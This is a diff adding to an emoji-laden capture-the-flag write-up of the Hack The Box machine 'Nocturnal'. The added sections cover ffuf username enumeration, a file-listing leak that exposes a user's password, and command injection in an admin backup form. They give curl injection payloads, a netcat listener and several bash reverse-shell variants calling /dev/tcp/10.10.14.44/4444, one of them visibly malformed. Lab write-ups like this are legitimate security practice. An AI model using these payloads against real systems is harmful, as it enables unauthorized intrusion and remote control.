@@ -157,4 +157,123 @@ wfuzz -c -w subdomains.txt -u 'http://nocturnal.htb/' -H "Host: FUZZ.nocturnal.h
 
 You've fully mapped the front door — login, upload, directory structure. The next step is **deeper exploitation via document payloads**, LFI edge cases, or back-end parser triggers. This box is taunting you with a classic **"uploads, but no execution"** trap!
 
-🧠 Stay relentless — your shell awaits... 🐚🔥
+## 🕵️‍♂️ Username Discovery via FFUF - Let's Fuzz 'em Out!
+
+We tried to find other valid `username=` values using FFUF with a large wordlist:
+
+```bash
+ffuf \
+  -w username.txt \
+  -u 'http://nocturnal.htb/view.php?username=FUZZ&file=bad.odt' \
+  -H "Cookie: PHPSESSID=eeu8n9ediu7qa4jnveg0jcpjjd" \
+  -fc 403 -t 50 -ac -c
+```
+
+🎯 **Hits Found!**
+
+```
+admin                   [Status: 200]
+amanda                  [Status: 200]
+tobias                  [Status: 200]
+...
+```
+
+We now know these usernames have file directories and can be queried with `view.php`.
+
+---
+
+## 📁 Dump Amanda’s Uploads - The Juicy Bits Appear!
+
+We attempted to fetch a non-existent file from Amanda's space to trigger a file list leak:
+
+```bash
+curl -s 'http://nocturnal.htb/view.php?username=amanda&file=nonexist.odt'
+```
+
+🎯 **Success! File listing returned.**  
+We fuzzed or manually tested each discovered filename and downloaded files, eventually retrieving a document (likely `.odt`) containing Amanda's **password**.
+
+---
+
+## 🔐 Admin Login - The Gate Opens!
+
+Login to the admin panel using Amanda’s credentials:
+
+```text
+Username: amanda
+Password: [extracted from downloaded file]
+```
+
+🎉 Admin panel unlocked!  
+Navigate to `admin.php` — it includes a form to generate backups. This form accepts a `password` field and a `backup` button.
+
+---
+
+## 🧨 Command Injection in Password Field!
+
+We discovered that the `password` field is directly passed into a shell command behind the scenes. This is likely a classic command injection vulnerability.
+
+### 🔬 Initial Test Payload:
+
+Try a simple test to confirm code execution:
+
+```bash
+curl -X POST "http://nocturnal.htb/admin.php?view=dashboard.php" \
+  -H "Cookie: PHPSESSID=pr4mhlgg8d9nk2v2cnn6kro302" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode $'password=\nbash\t-c\t"ls"\n' \
+  --data "backup="
+```
+
+✅ Command executed — response included file listing output!
+
+---
+
+## 🐚 Let's Try a Reverse Shell Payload!
+
+Target IP: `10.10.14.44`  
+Listener Port: `4444`
+
+### 🔉 Set up a Netcat listener:
+
+```bash
+nc -lvnp 4444
+```
+
+### 📡 Inject Reverse Shell via URL-encoded Payload:
+
+```bash
+curl -X POST "http://nocturnal.htb/admin.php?view=dashboard.php" \
+  -H "Cookie: PHPSESSID=pr4mhlgg8d9nk2v2cnn6kro302" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode $'password=\nbash\t-i\t>&\t/dev/tcp/10.10.14.44/4444\t0>&1\n' \
+  --data "backup="
+```
+
+We tried multiple variations:
+
+- `%0Abash%09-i%09%3E%26%09/dev/tcp/10.10.14.44/4444%090%3E%261`
+- `%0Abash%09-i%09%3E%26%09%2Fdev%2Ftcp%2F10.10.14.44%2F4444%090%3E%261`
+- `%0Abash%09-i%09>&%09/dev/tcp/10.10.14.44/4444%090>&1`
+- `\nexec\tbash\t-i\t>\t/dev/tcp/10.10.14.44/4444\t0</dev/tcp/10.10.14.44/44442>/dev/null`
+
+Each one is a variation of a **bash reverse shell** using either newline/tab characters or their URL-encoded equivalents to try to bypass any input sanitization.
+
+---
+
+## ⏳ Status
+
+- ✅ Verified command injection via `password` field
+- ✅ Remote shell possible — pending correct payload execution
+- 🧪 Trying different shell syntax variants to bypass filters and get execution
+
+---
+
+## 🔭 Next Steps
+
+- 🔁 Keep testing reverse shell syntax
+- 💡 Try alternative shells (`sh`, `nc`, `python`)
+- 📉 Use `tcpdump` or Wireshark to confirm connection attempts if shell doesn’t return
+- 👀 Review downloaded `admin.php` (from backup) to analyze sanitization logic
+
+Stay tuned — we're *so close* to shellfire! 🔥🐚
